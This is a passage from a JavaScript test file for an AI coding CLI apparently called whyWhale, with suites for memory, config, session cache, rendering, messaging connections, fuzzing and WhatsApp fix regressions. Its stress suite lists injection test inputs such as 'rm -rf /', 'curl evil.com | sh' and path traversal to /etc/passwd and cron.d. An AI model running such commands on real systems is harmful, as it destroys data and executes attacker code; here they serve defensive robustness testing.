  const skp = parseMemoryBlocks(shortKey);
  assert('parseMemoryBlocks: rejects short key (<2 chars)', skp.length === 0);

  // empty/null/undefined must not throw
  for (const bad of ['', null, undefined, 0, [], {}]) {
    let t = false;
    try { parseMemoryBlocks(bad); } catch (_) { t = true; }
    assert(`parseMemoryBlocks: doesn't throw on ${JSON.stringify(bad)}`, !t);
  }

  // ── updateMemory ──────────────────────────────────────────────────────────
  const testMem = { facts: [], projects: {}, sessionSummaries: [], created: new Date().toISOString(), lastUpdated: null };
  updateMemory(testMem, [{ key: 'project_name', value: 'testapp' }]);
  assert('updateMemory: adds fact to memory',
    testMem.facts.some(f => f.key === 'project_name' && f.value === 'testapp'));

  // duplicate key should upsert (not duplicate)
  updateMemory(testMem, [{ key: 'project_name', value: 'updated-app' }]);
  const dupes = testMem.facts.filter(f => f.key === 'project_name');
  assert('updateMemory: upserts duplicate key (no duplicate facts)',
    dupes.length === 1 && dupes[0].value === 'updated-app');

  // multiple updates
  updateMemory(testMem, [{ key: 'port', value: '3000' }, { key: 'stack', value: 'express' }]);
  assert('updateMemory: handles multiple facts at once',
    testMem.facts.some(f => f.key === 'port') && testMem.facts.some(f => f.key === 'stack'));

  // ── sanitizeMemory ────────────────────────────────────────────────────────
  if (typeof sanitizeMemory === 'function') {
    const corrupt = { facts: 'not-an-array', sessionSummaries: null };
    const sane = sanitizeMemory(corrupt);
    assert('sanitizeMemory: converts corrupt facts to array',           Array.isArray(sane.facts));
    assert('sanitizeMemory: converts corrupt sessionSummaries to array',Array.isArray(sane.sessionSummaries));

    const withBadFacts = sanitizeMemory({ facts: [{}, null, { key:'ok', value:'yep' }, 42], sessionSummaries: [] });
    assert('sanitizeMemory: filters invalid fact entries',
      withBadFacts.facts.every(f => typeof f.key === 'string' && typeof f.value === 'string'));
  } else { skip('sanitizeMemory not exported'); }

  // ── buildMemoryContext ─────────────────────────────────────────────────────
  if (typeof buildMemoryContext === 'function') {
    const richMem = {
      facts: [{ key:'project_name', value:'myapp' }, { key:'port', value:'3000' }],
      sessionSummaries: ['Did X', 'Did Y'],
      projects: {},
    };
    const ctx = buildMemoryContext(richMem, process.cwd());
    assert('buildMemoryContext: returns a string', typeof ctx === 'string');
    assert('buildMemoryContext: contains fact key',   ctx.includes('project_name'));
    assert('buildMemoryContext: contains fact value', ctx.includes('myapp'));

    const emptyCtx = buildMemoryContext({ facts: [], sessionSummaries: [], projects: {} }, process.cwd());
    assert('buildMemoryContext: returns string for empty memory', typeof emptyCtx === 'string');
  } else { skip('buildMemoryContext not exported'); }

  // ── Stress: 1000 rapid parseMemoryBlocks calls ────────────────────────────
  let stressThrew = false;
  for (let i = 0; i < 1000; i++) {
    const input = `@@MEMORY: key_${i}: value ${crypto.randomBytes(10).toString('hex')}`;
    try { parseMemoryBlocks(input); }
    catch (_) { stressThrew = true; break; }
  }
  assert('stress: 1000 parseMemoryBlocks calls never throw', !stressThrew);
}

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 9 — config / skill registry (NEW)
// ══════════════════════════════════════════════════════════════════════════════
function runConfig() {
  suite('config');

  const mod = tryRequire(path.join(LIB, 'config'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { loadConfig, saveConfig, SKILL_REGISTRY, loadSkills, saveSkill,
          buildSkillsContext, CONFIG_PATH, MEMORY_PATH, SESS_DIR, SKILLS_DIR } = mod;

  // ── Exports ───────────────────────────────────────────────────────────────
  assert('loadConfig is a function',      typeof loadConfig      === 'function');
  assert('saveConfig is a function',      typeof saveConfig      === 'function');
  assert('SKILL_REGISTRY is an object',   typeof SKILL_REGISTRY  === 'object' && SKILL_REGISTRY !== null);
  assert('loadSkills is a function',      typeof loadSkills      === 'function');
  assert('saveSkill is a function',       typeof saveSkill       === 'function');
  assert('buildSkillsContext is a function', typeof buildSkillsContext === 'function');

  // ── Path constants ────────────────────────────────────────────────────────
  assert('CONFIG_PATH is a string',       typeof CONFIG_PATH === 'string');
  assert('MEMORY_PATH is a string',       typeof MEMORY_PATH === 'string');
  assert('SESS_DIR is a string',          typeof SESS_DIR    === 'string');
  assert('SKILLS_DIR is a string',        typeof SKILLS_DIR  === 'string');
  assert('CONFIG_PATH ends in .json',     CONFIG_PATH.endsWith('.json'));
  assert('MEMORY_PATH ends in .json',     MEMORY_PATH.endsWith('.json'));
  assert('SESS_DIR contains whyWhale',    SESS_DIR.toLowerCase().includes('whywhale'));

  // ── SKILL_REGISTRY completeness ───────────────────────────────────────────
  const expectedSkills = ['react','python','security','testing','api-design',
                           'docker','database','git','performance','typescript'];
  assert('SKILL_REGISTRY has all 10 skills',
    expectedSkills.every(k => k in SKILL_REGISTRY),
    `missing: ${expectedSkills.filter(k => !(k in SKILL_REGISTRY)).join(', ')}`);

  for (const [key, skill] of Object.entries(SKILL_REGISTRY)) {
    assert(`skill "${key}" has name string`,        typeof skill.name        === 'string' && skill.name.length > 0);
    assert(`skill "${key}" has description string`, typeof skill.description === 'string' && skill.description.length > 0);
    assert(`skill "${key}" has prompt string`,      typeof skill.prompt      === 'string' && skill.prompt.length > 20);
  }

  // All skill names must be unique
  const names = Object.values(SKILL_REGISTRY).map(s => s.name);
  assert('all skill names are unique', new Set(names).size === names.length);

  // ── loadConfig returns an object ──────────────────────────────────────────
  const cfg = loadConfig();
  assert('loadConfig: returns an object', typeof cfg === 'object' && cfg !== null);

  // ── buildSkillsContext ────────────────────────────────────────────────────
  const fakeSkills = [
    SKILL_REGISTRY['react'],
    SKILL_REGISTRY['docker'],
  ];
  const ctx = buildSkillsContext(fakeSkills);
  assert('buildSkillsContext: returns a string', typeof ctx === 'string');
  assert('buildSkillsContext: contains skill name', ctx.includes('React') || ctx.includes('react'));

  const emptyCtx = buildSkillsContext([]);
  assert('buildSkillsContext: returns string for empty array', typeof emptyCtx === 'string');

  // ── loadSkills never throws ───────────────────────────────────────────────
  let lsThrew = false;
  try { loadSkills(); } catch (_) { lsThrew = true; }
  assert('loadSkills: never throws', !lsThrew);

  // ── saveConfig/loadConfig roundtrip ───────────────────────────────────────
  const testCfg = { provider: 'anthropic', model: 'claude-3-haiku', _test: true };
  try {
    saveConfig(testCfg);
    const loaded = loadConfig();
    assert('saveConfig/loadConfig: roundtrip preserves provider', loaded.provider === 'anthropic');
    assert('saveConfig/loadConfig: roundtrip preserves model',    loaded.model    === 'claude-3-haiku');
  } catch (e) { skip(`saveConfig roundtrip (${e.message})`); }
}

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 10 — session cache (NEW)
// ══════════════════════════════════════════════════════════════════════════════
function runSessionCache() {
  suite('sessioncache');

  const mod = tryRequire(path.join(LIB, 'session-cache'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { loadCache, saveCache, freshCache, recordFile, recordCommand,
          recordError, recordTokens, buildSessionContext, resetCache } = mod;

  assert('loadCache is a function',          typeof loadCache          === 'function');
  assert('saveCache is a function',          typeof saveCache          === 'function');
  assert('freshCache is a function',         typeof freshCache         === 'function');
  assert('recordFile is a function',         typeof recordFile         === 'function');
  assert('recordCommand is a function',      typeof recordCommand      === 'function');
  assert('recordError is a function',        typeof recordError        === 'function');
  assert('recordTokens is a function',       typeof recordTokens       === 'function');
  assert('buildSessionContext is a function',typeof buildSessionContext === 'function');

  // ── freshCache structure ──────────────────────────────────────────────────
  const fc = freshCache();
  assert('freshCache: returns object',               typeof fc === 'object' && fc !== null);
  assert('freshCache: has sessionId string',         typeof fc.sessionId === 'string');
  assert('freshCache: has files object',             typeof fc.files === 'object');
  assert('freshCache: has commands array',           Array.isArray(fc.commands));
  assert('freshCache: has errors array',             Array.isArray(fc.errors));
  assert('freshCache: has history array',            Array.isArray(fc.history));
  assert('freshCache: tasksDone starts at 0',        fc.tasksDone === 0);
  assert('freshCache: tasksFailed starts at 0',      fc.tasksFailed === 0);
  assert('freshCache: totalTokens starts at 0',      fc.totalTokens === 0);

  // ── recordFile ────────────────────────────────────────────────────────────
  const cache = freshCache();
  recordFile(cache, 'src/app.js', 'const x = 1;\nconst y = 2;\n', 'created');
  const keys = Object.keys(cache.files);
  assert('recordFile: adds entry to cache.files', keys.length === 1);
  const entry = cache.files[keys[0]];
  assert('recordFile: entry has lines count',  typeof entry.lines === 'number' && entry.lines >= 1);
  assert('recordFile: entry has status',       typeof entry.status === 'string');
  assert('recordFile: entry has createdAt',    typeof entry.createdAt === 'string');

  // update same file
  recordFile(cache, 'src/app.js', 'const x = 1;\nconst y = 2;\nconst z = 3;\n', 'modified');
  assert('recordFile: updates existing entry on re-record', Object.keys(cache.files).length === 1);
  assert('recordFile: updated entry shows modified status', cache.files[keys[0]].status === 'modified');

  // ── recordCommand ─────────────────────────────────────────────────────────
  recordCommand(cache, 'node server.js', 0, null);
  assert('recordCommand: adds entry to commands array', cache.commands.length === 1);
  assert('recordCommand: entry has cmd',      cache.commands[0].cmd === 'node server.js');
  assert('recordCommand: entry has exitCode', cache.commands[0].exitCode === 0);

  recordCommand(cache, 'node broken.js', 1, 'Error: ENOENT');
  assert('recordCommand: records failed commands', cache.commands.length === 2);
  assert('recordCommand: records exitCode 1',      cache.commands[1].exitCode === 1);
  assert('recordCommand: records error text',      cache.commands[1].error?.includes('ENOENT'));

  // ── recordError ───────────────────────────────────────────────────────────
  recordError(cache, 'TypeError: something went wrong');
  assert('recordError: adds to errors array', cache.errors.length >= 1);

  // ── recordTokens ──────────────────────────────────────────────────────────
  recordTokens(cache, 500);
  assert('recordTokens: increases totalTokens', cache.totalTokens >= 500);

  recordTokens(cache, 300);
  assert('recordTokens: accumulates totalTokens', cache.totalTokens >= 800);

  // ── buildSessionContext ───────────────────────────────────────────────────
  const ctx = buildSessionContext(cache);
  assert('buildSessionContext: returns string', typeof ctx === 'string');
  assert('buildSessionContext: non-empty for populated cache', ctx.length > 0);

  const emptyCtx = buildSessionContext(freshCache());
  assert('buildSessionContext: handles empty cache', typeof emptyCtx === 'string');

  // ── saveCache/loadCache roundtrip ─────────────────────────────────────────
  const testCache = freshCache();
  testCache._testMarker = 'stress-test-marker';
  try {
    saveCache(testCache);
    const loaded = loadCache();
    assert('saveCache/loadCache: roundtrip works', loaded._testMarker === 'stress-test-marker');
  } catch (e) { skip(`saveCache roundtrip (${e.message})`); }

  // ── resetCache ────────────────────────────────────────────────────────────
  if (typeof resetCache === 'function') {
    let resetThrew = false;
    try { resetCache(); } catch (_) { resetThrew = true; }
    assert('resetCache: never throws', !resetThrew);
  } else { skip('resetCache not exported'); }

  // ── Stress: 500 rapid recordFile calls ───────────────────────────────────
  let stressThrew = false;
  const bigCache = freshCache();
  for (let i = 0; i < 500; i++) {
    try { recordFile(bigCache, `file${i}.js`, `const x${i} = ${i};\n`, 'created'); }
    catch (_) { stressThrew = true; break; }
  }
  assert('stress: 500 rapid recordFile calls never throw', !stressThrew);

  // ── Stress: 1000 rapid recordCommand calls ────────────────────────────────
  let cmdStressThrew = false;
  for (let i = 0; i < 1000; i++) {
    try { recordCommand(bigCache, `node cmd${i}.js`, i % 2, i % 2 ? 'err' : null); }
    catch (_) { cmdStressThrew = true; break; }
  }
  assert('stress: 1000 rapid recordCommand calls never throw', !cmdStressThrew);
}

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 11 — render (NEW)
// ══════════════════════════════════════════════════════════════════════════════
function runRender() {
  suite('render');

  const mod = tryRequire(path.join(LIB, 'render'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { formatMD, spinner, renderPS1, printLogo, printBanner } = mod;

  assert('formatMD is a function',    typeof formatMD    === 'function');
  assert('spinner is a function',     typeof spinner     === 'function');

  // ── formatMD ─────────────────────────────────────────────────────────────
  const testCases = [
    ['plain text',            'Hello world',                     'Hello world'],
    ['bold **text**',         '**bold**',                        'bold'],
    ['inline `code`',         'use `console.log`',               'console.log'],
    ['heading # H1',          '# Heading One',                   'Heading One'],
    ['heading ## H2',         '## Sub Heading',                  'Sub Heading'],
    ['bullet - item',         '- item one',                      'item one'],
    ['bullet * item',         '* item two',                      'item two'],
    ['numbered 1.',           '1. first',                        'first'],
    ['empty string',          '',                                ''],
    ['unicode 🐋',            'Hello 🐋',                        '🐋'],
    ['long text 10k',         'word '.repeat(2000),              'word'],
  ];

  for (const [label, input, expectedFragment] of testCases) {
    let result, threw = false;
    try { result = formatMD(input); }
    catch (_) { threw = true; }
    assert(`formatMD: doesn't throw on ${label}`, !threw);
    if (!threw) {
      assert(`formatMD: returns string for ${label}`, typeof result === 'string');
      if (expectedFragment) {
        assert(`formatMD: output contains "${expectedFragment}"`,
          result.includes(expectedFragment), `got: ${result.slice(0,80)}`);
      }
    }
  }

  // Code blocks should be formatted
  const codeInput = '```js\nconst x = 1;\n```';
  let codeResult, codeThrew = false;
  try { codeResult = formatMD(codeInput); } catch (_) { codeThrew = true; }
  assert('formatMD: handles code block without throwing', !codeThrew);
  if (!codeThrew) assert('formatMD: code block returns string', typeof codeResult === 'string');

  // Null/undefined must not throw
  for (const bad of [null, undefined, 0, [], {}]) {
    let t = false;
    try { formatMD(bad); } catch (_) { t = true; }
    assert(`formatMD: doesn't throw on ${JSON.stringify(bad)}`, !t);
  }

  // ── spinner ───────────────────────────────────────────────────────────────
  let spinObj, spinThrew = false;
  try { spinObj = spinner('Testing...', 'code'); } catch (_) { spinThrew = true; }
  assert('spinner: creates without throwing', !spinThrew);
  if (!spinThrew && spinObj) {
    assert('spinner: has stop method',     typeof spinObj.stop    === 'function');
    assert('spinner: has succeed method',  typeof spinObj.succeed === 'function');
    assert('spinner: has fail method',     typeof spinObj.fail    === 'function');
    assert('spinner: has update method',   typeof spinObj.update  === 'function');

    // stop the spinner so it doesn't mess up test output
    try { spinObj.stop(); } catch (_) {}
  }

  // ── renderPS1 ─────────────────────────────────────────────────────────────
  if (typeof renderPS1 === 'function') {
    const modesMod = tryRequire(path.join(LIB, 'modes'));
    let ps1, ps1Threw = false;
    try {
      ps1 = renderPS1(5, '/home/user/project', 'code',
        modesMod._error ? {} : modesMod.MODES);
    } catch (_) { ps1Threw = true; }
    assert('renderPS1: does not throw', !ps1Threw);
    if (!ps1Threw) assert('renderPS1: returns string', typeof ps1 === 'string');
  } else { skip('renderPS1 not exported'); }

  // ── Stress: 1000 formatMD calls ──────────────────────────────────────────
  let stressThrew = false;
  try {
    for (let i = 0; i < 1000; i++) {
      formatMD(`# Heading\n\n- item ${i}\n\`\`\`js\nconst x = ${i};\n\`\`\`\n**bold** and _italic_`);
    }
  } catch (_) { stressThrew = true; }
  assert('stress: 1000 formatMD calls never throw', !stressThrew);
}

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 12 — connections (NEW)
// ══════════════════════════════════════════════════════════════════════════════
function runConnections() {
  suite('connections');

  const mod = tryRequire(path.join(LIB, 'connections'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { CONNECTION_REGISTRY, loadConnections, saveConnections,
          getConnectionStatus, disconnectConnection } = mod;

  assert('CONNECTION_REGISTRY is an object', typeof CONNECTION_REGISTRY === 'object');
  assert('loadConnections is a function',    typeof loadConnections     === 'function');
  assert('getConnectionStatus is a function',typeof getConnectionStatus === 'function');

  // ── Registry completeness ─────────────────────────────────────────────────
  const required = ['whatsapp','telegram','discord'];
  for (const id of required) {
    assert(`CONNECTION_REGISTRY has "${id}"`, id in CONNECTION_REGISTRY,
      `missing: ${id}`);
  }

  for (const [id, conn] of Object.entries(CONNECTION_REGISTRY)) {
    assert(`connection "${id}" has id field`,          conn.id   === id);
    assert(`connection "${id}" has name string`,       typeof conn.name        === 'string' && conn.name.length > 0);
    assert(`connection "${id}" has icon string`,       typeof conn.icon        === 'string' && conn.icon.length > 0);
    assert(`connection "${id}" has description`,       typeof conn.description === 'string' && conn.description.length > 0);
    assert(`connection "${id}" has packages array`,    Array.isArray(conn.packages));
  }

  // WhatsApp must NOT be comingSoon
  assert('whatsapp is not marked comingSoon', !CONNECTION_REGISTRY.whatsapp?.comingSoon);

  // Telegram and Discord should be comingSoon
  assert('telegram is marked comingSoon', CONNECTION_REGISTRY.telegram?.comingSoon === true);
  assert('discord is marked comingSoon',  CONNECTION_REGISTRY.discord?.comingSoon  === true);

  // WhatsApp must have the Baileys package
  assert('whatsapp packages include baileys',
    CONNECTION_REGISTRY.whatsapp.packages.some(p => p.toLowerCase().includes('baileys')));

  // ── loadConnections never throws ──────────────────────────────────────────
  let lcThrew = false;
  try { loadConnections(); } catch (_) { lcThrew = true; }
  assert('loadConnections: never throws', !lcThrew);

  // ── getConnectionStatus ───────────────────────────────────────────────────
  let gsThrew = false;
  try {
    getConnectionStatus('whatsapp');
    getConnectionStatus('telegram');
    getConnectionStatus('discord');
    getConnectionStatus('nonexistent');
  } catch (_) { gsThrew = true; }
  assert('getConnectionStatus: never throws for any id', !gsThrew);

  // ── disconnectConnection ──────────────────────────────────────────────────
  if (typeof disconnectConnection === 'function') {
    let dcThrew = false;
    try { disconnectConnection('nonexistent'); } catch (_) { dcThrew = true; }
    assert('disconnectConnection: does not throw for unknown id', !dcThrew);
  } else { skip('disconnectConnection not exported'); }
}

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 13 — stress / fuzz / injection / load
// ══════════════════════════════════════════════════════════════════════════════
async function runStress() {
  suite('stress');

  // ── Rapid mode switching (300 cycles) ─────────────────────────────────────
  const autoMod = tryRequire(path.join(LIB, 'main', 'autoDetect'));
  if (!autoMod._error) {
    const { autoDetectModeAndSkills } = autoMod;
    const msgs = ['fix this bug','explain closures','build a complete app',
                  'review my code','design the architecture','write a function',
                  'plan the project','what is a closure'];
    const ctx = {
      mode:'chat', agentTaskActive:false, providerKey:'x', apiKey:'x',
      modelId:'x', autoTest:false, autoScan:false, skills:[], statusRef:{ mode:'chat' },
    };
    let switchThrew = false;
    for (let i = 0; i < 300; i++) {
      try { autoDetectModeAndSkills(msgs[i % msgs.length], ctx); }
      catch (_) { switchThrew = true; break; }
    }
    assert('stress: 300 rapid mode switches never throw', !switchThrew);
  }

  // ── parseFileBlocks: pathological inputs ──────────────────────────────────
  const fsMod = tryRequire(path.join(LIB, 'filesystem'));
  if (!fsMod._error) {
    const { parseFileBlocks } = fsMod;
    const paths = [
      null, undefined, 0, [], {},
      '@@FILE: ' + 'a'.repeat(10000) + '\n```\ncode\n```\n@@END',
      '@@FILE: ../../../etc/passwd\n```\ncode\n```\n@@END',
      '@@FILE: \x00evil\n```\ncode\n```\n@@END',
      '\n'.repeat(10000),
      '```'.repeat(1000),
      '@@FILE: C:\\Windows\\system32\\evil.exe\n```\ncode\n```\n@@END',
      '@@FILE: /etc/cron.d/evil\n```\ncode\n```\n@@END',
    ];
    for (const input of paths) {
      let threw = false;
      try { parseFileBlocks(input); } catch (_) { threw = true; }
      const lbl = typeof input === 'string'
        ? `parseFileBlocks: no throw on "${input.slice(0,35).replace(/\n/g,'\\n')}..."`
        : `parseFileBlocks: no throw on ${JSON.stringify(input)}`;
      assert(lbl, !threw);
    }

    // Path traversal should not resolve to /etc
    const t = parseFileBlocks('@@FILE: ../../../etc/passwd\n```\ncode\n```\n@@END');
    if (t.length > 0) {
      assert('parseFileBlocks: traversal path is not normalised to /etc/passwd',
        !path.resolve('/safe', t[0].file || '').startsWith('/etc'));
    }
  }

  // ── parseMemoryBlocks: fuzz ───────────────────────────────────────────────
  const cfgMod = tryRequire(path.join(LIB, 'config'));
  if (!cfgMod._error) {
    const { parseMemoryBlocks } = cfgMod;
    let fuzzThrew = false;
    for (let i = 0; i < 500; i++) {
      const rnd = '@@MEMORY: ' + crypto.randomBytes(20).toString('hex') + ': ' + crypto.randomBytes(20).toString('hex');
      try { parseMemoryBlocks(rnd); parseMemoryBlocks(crypto.randomBytes(100).toString('utf8')); }
      catch (_) { fuzzThrew = true; break; }
    }
    assert('stress: 500 fuzz parseMemoryBlocks calls never throw', !fuzzThrew);
  }

  // ── dmPolicy fuzz ─────────────────────────────────────────────────────────
  const dmMod = tryRequire(path.join(CONN, 'dmPolicy'));
  if (!dmMod._error) {
    const { dmGuard, pairingTable } = dmMod;
    pairingTable.clear();
    const fuzzSock = { sendMessage: async () => {} };

    const fuzzSenders = [
      '', '@s.whatsapp.net', 'notanumber@s.whatsapp.net',
      '9'.repeat(50) + '@s.whatsapp.net', '\x00\x01@s.whatsapp.net',
      'null@s.whatsapp.net', '0@s.whatsapp.net',
    ];
    let senderThrew = false;
    for (const s of fuzzSenders) {
      try { await dmGuard({ sender:s, text:'hi', policy:'open', allowFrom:[], sock:fuzzSock }); }
      catch (_) { senderThrew = true; break; }
    }
    assert('dmGuard: fuzz senders never throw', !senderThrew);

    const fuzzTexts = ['', '\x00\x01\x02', '💀'.repeat(1000), '\n\r\t'.repeat(500), null, undefined, 0];
    let textThrew = false;
    for (const text of fuzzTexts) {
      try { await dmGuard({ sender:'911234567890@s.whatsapp.net', text, policy:'open', allowFrom:[], sock:fuzzSock }); }
      catch (_) { textThrew = true; break; }
    }
    assert('dmGuard: fuzz message texts never throw', !textThrew);

    // Memory leak check: pairing table should not grow unboundedly
    pairingTable.clear();
    for (let i = 0; i < 100; i++) {
      const s = `91999${String(i).padStart(7,'0')}@s.whatsapp.net`;
      await dmGuard({ sender:s, text:'hi', policy:'pairing', allowFrom:[], sock:fuzzSock });
    }
    assert('pairing table does not grow unboundedly under 100 new senders',
      pairingTable.size <= 100, `table size: ${pairingTable.size}`);
    pairingTable.clear();
  }

  // ── Command dispatcher: injection attempts ────────────────────────────────
  const cmdMod = tryRequire(path.join(LIB, 'main', 'commands'));
  if (!cmdMod._error) {
    const { dispatchCommand } = cmdMod;
    const baseCtx = {
      mode:'code', skills:[], memory:[], history:[], sessionName:'test',
      startTime:Date.now(), tokens:{in:0,out:0}, statusRef:{},
      lastReply:'', providerKey:'anthropic', modelId:'x',
      apiKey:'sk-test', autoTest:false, autoScan:false, agentTaskActive:false,
    };

    const injections = [
      '/read ../../../../etc/passwd',
      '/create ../../../../etc/cron.d/evil',
      '/delete ../../../../etc/hosts',
      '/read $(whoami)',
      '/run ; rm -rf /',
      '/run && curl evil.com | sh',
      '/read %2e%2e%2fetc%2fpasswd',
      '/read \x00null-byte.js',
      '/create \x00evil.sh',
      '/run `id`',
    ];
    let injThrew = false;
    for (const cmd of injections) {
      try { await dispatchCommand(cmd, { ...baseCtx }); }
      catch (_) { /* handler throwing is fine — router must not crash */ }
    }
    assert('dispatcher: injection attempts dispatched without crashing router', !injThrew);

    // Unicode filenames
    const unicode = ['/read 日本語.js','/read файл.txt','/read 🐋.js','/create مرحبا.js','/read file with spaces.js'];
    let unicodeThrew = false;
    for (const cmd of unicode) {
      try { await dispatchCommand(cmd, { ...baseCtx }); }
      catch (_) { /* handler can throw */ }
    }
    assert('dispatcher: unicode filenames dispatched without crash', !unicodeThrew);

    // 1000 stress
    let stressThrew = false;
    for (let i = 0; i < 1000; i++) {
      try { await dispatchCommand('/' + crypto.randomBytes(8).toString('hex'), { ...baseCtx }); }
      catch (_) { stressThrew = true; break; }
    }
    assert('stress: 1000 random /commands never throw from router', !stressThrew);
  }

  // ── autoDetect: conflicting signals resolve safely ────────────────────────
  if (!autoMod._error) {
    const { autoDetectModeAndSkills } = autoMod;
    const validModes = ['code','chat','debug','explain','review','architect','plan','agent'];
    const conflicting = [
      'explain and fix this bug',
      'review and write a new function',
      'debug and design the architecture',
      'plan and build the whole app',
      'explain and create a dockerfile',
    ];
    for (const input of conflicting) {
      const ctx = {
        mode:'chat', agentTaskActive:false, providerKey:'x', apiKey:'x',
        modelId:'x', autoTest:false, autoScan:false, skills:[], statusRef:{},
      };
      let threw = false;
      try { autoDetectModeAndSkills(input, ctx); } catch (_) { threw = true; }
      assert(`conflicting signals: "${input.slice(0,35)}" does not throw`, !threw);
      assert(`conflicting signals: resolves to valid mode`,
        validModes.includes(ctx.mode), `got "${ctx.mode}"`);
    }
  }

  // ── formatMD: extreme inputs ──────────────────────────────────────────────
  const renderMod = tryRequire(path.join(LIB, 'render'));
  if (!renderMod._error) {
    const { formatMD } = renderMod;
    const extreme = [
      '#'.repeat(1000),
      '**' + 'bold '.repeat(5000) + '**',
      '`' + 'code '.repeat(5000) + '`',
      '- '.repeat(5000),
      '```\n' + 'code\n'.repeat(1000) + '```',
      '\x00\x01\x02\x03\x04',
      '🐋'.repeat(10000),
      '@@MEMORY: key: value\n@@FILE: test.js\n```\ncode\n```\n@@END',
    ];
    let extremeThrew = false;
    for (const input of extreme) {
      try { formatMD(input); } catch (_) { extremeThrew = true; break; }
    }
    assert('stress: formatMD handles extreme/pathological inputs', !extremeThrew);
  }

  // ── sessionCache: large cache never crashes ───────────────────────────────
  const scMod = tryRequire(path.join(LIB, 'session-cache'));
  if (!scMod._error) {
    const { freshCache, recordFile, buildSessionContext } = scMod;
    const bigCache = freshCache();
    let bigThrew = false;
    try {
      for (let i = 0; i < 200; i++) recordFile(bigCache, `file${i}.js`, 'x'.repeat(500), 'created');
      buildSessionContext(bigCache);
    } catch (_) { bigThrew = true; }
    assert('stress: buildSessionContext with 200 files never throws', !bigThrew);
  }

  // ── Colors: every fn with every edge case ────────────────────────────────
  const colorsMod = tryRequire(path.join(LIB, 'colors'));
  if (!colorsMod._error) {
    const { wh, cr, kp, rf, ab, sd, dg, vt, tl, fm, bd, dm } = colorsMod;
    const fns = [wh,cr,kp,rf,ab,sd,dg,vt,tl,fm,bd,dm].filter(f => typeof f === 'function');
    const edgeInputs = ['', '\x00', '🐋'.repeat(1000), '\n\r\t', 'x'.repeat(100000), null, undefined];
    let colorEdgeThrew = false;
    for (const fn of fns) {
      for (const input of edgeInputs) {
        try { fn(input); } catch (_) { colorEdgeThrew = true; break; }
      }
      if (colorEdgeThrew) break;
    }
    assert('stress: color fns handle all edge inputs', !colorEdgeThrew);
  }

  console.log('');
}

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 14 — whatsapp: module exports, source-code audit, fix regression checks
// ══════════════════════════════════════════════════════════════════════════════
async function runWhatsApp() {
  suite('whatsapp');

  // ── Module exports ────────────────────────────────────────────────────────
  const mod = tryRequire(path.join(CONN, 'index'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { startWhatsApp, sendFarewellMessage, resetSession, sendToOwner, getActiveSock } = mod;
  assert('startWhatsApp is a function',      typeof startWhatsApp      === 'function');
  assert('sendFarewellMessage is a function',typeof sendFarewellMessage === 'function');
  assert('resetSession is a function',       typeof resetSession        === 'function');
  assert('sendToOwner is a function',        typeof sendToOwner         === 'function');
  assert('getActiveSock is exported (fix #3)',typeof getActiveSock      === 'function');
  assert('getActiveSock() returns null when no session active', getActiveSock() === null);

  // ── Read sources for audit ────────────────────────────────────────────────
  const waIndexSrc   = fs.readFileSync(path.join(CONN, 'index.js'),   'utf8');
  const connSrc      = fs.readFileSync(path.join(LIB, 'connections.js'), 'utf8');
  const cmdConnSrc   = fs.readFileSync(path.join(LIB, 'main', 'command', 'connections.js'), 'utf8');
  const mainIdxSrc   = fs.readFileSync(path.join(LIB, 'main', 'index.js'), 'utf8');

  // ── Fix #1: _startupSent not reset on 440 reconnect ──────────────────────
  // Extract code-440 block and ensure _startupSent = false is NOT in it
  const idx440Start = waIndexSrc.indexOf('if (code === 440)');
  const idx440End   = waIndexSrc.indexOf('return;', idx440Start);
  const block440    = idx440Start >= 0 ? waIndexSrc.slice(idx440Start, idx440End) : '';
  assert('fix #1: _startupSent NOT reset inside code-440 block',
    block440.length > 0 && !block440.includes('_startupSent = false'),
    'Found _startupSent = false inside 440 retry path');

  // _startupSent MUST be reset on true logout
  const idxLogout  = waIndexSrc.indexOf('if (loggedOut)');
  const idxLEnd    = waIndexSrc.indexOf('return;', idxLogout);
  const blockLogout = idxLogout >= 0 ? waIndexSrc.slice(idxLogout, idxLEnd) : '';
  assert('fix #1: _startupSent IS reset on true logout',
    blockLogout.includes('_startupSent = false'),
    '_startupSent not cleared on logout — startup DM blocked after re-login');

  // _startupSent must be reset on 401/403 (fresh QR scan)
  const idx401     = waIndexSrc.indexOf('code === 401 || code === 403');
  const idx401End  = waIndexSrc.indexOf('return;', idx401);
  const block401   = idx401 >= 0 ? waIndexSrc.slice(idx401, idx401End) : '';
  assert('fix #1: _startupSent IS reset on auth error (401/403)',
    block401.includes('_startupSent = false'),
    '_startupSent not cleared after auth wipe — startup DM would be suppressed after QR re-scan');

  // _startupSent must NOT be reset at the top of startWhatsApp()
  const idxSWA       = waIndexSrc.indexOf('async function startWhatsApp');
  const idxSock      = waIndexSrc.indexOf('_activeSock  = sock', idxSWA);
  const sockInitBlock = idxSWA >= 0 && idxSock >= 0
    ? waIndexSrc.slice(idxSWA, idxSock + 80) : '';
  assert('fix #1: _startupSent NOT reset at startWhatsApp() sock-init',
    !sockInitBlock.includes('_startupSent = false'),
    'startWhatsApp unconditionally resets _startupSent — causes duplicate startup DMs on reconnect');

  // ── Fix #2: lib/connections.js must not cache-bust on every /wp call ─────
  assert('fix #2: tryLoad accepts bustCache parameter',
    connSrc.includes('bustCache') || connSrc.includes('bust'),
    'connections.js tryLoad does not have bustCache guard — every /wp call wipes WA module state');

  // delete require.cache must only appear inside the "installed" branch, not unconditionally
  assert('fix #2: cache-bust is conditional (not unconditional at tryLoad top)',
    !connSrc.match(/const tryLoad\s*=\s*\(\)\s*=>\s*\{\s*delete require\.cache/),
    'tryLoad still has unconditional delete require.cache — module state wiped on every /wp');

  // ── Fix #3: lib/main/index.js sets ctx.waClient in onConnected ───────────
  assert('fix #3: onConnected sets ctx.waClient',
    mainIdxSrc.includes('ctx.waClient = getActiveSock()') || mainIdxSrc.includes('ctx.waClient ='),
    'onConnected callback never sets ctx.waClient — /wa send always fails');

  assert('fix #3: onDisconnected clears ctx.waClient',
    mainIdxSrc.includes('ctx.waClient = null'),
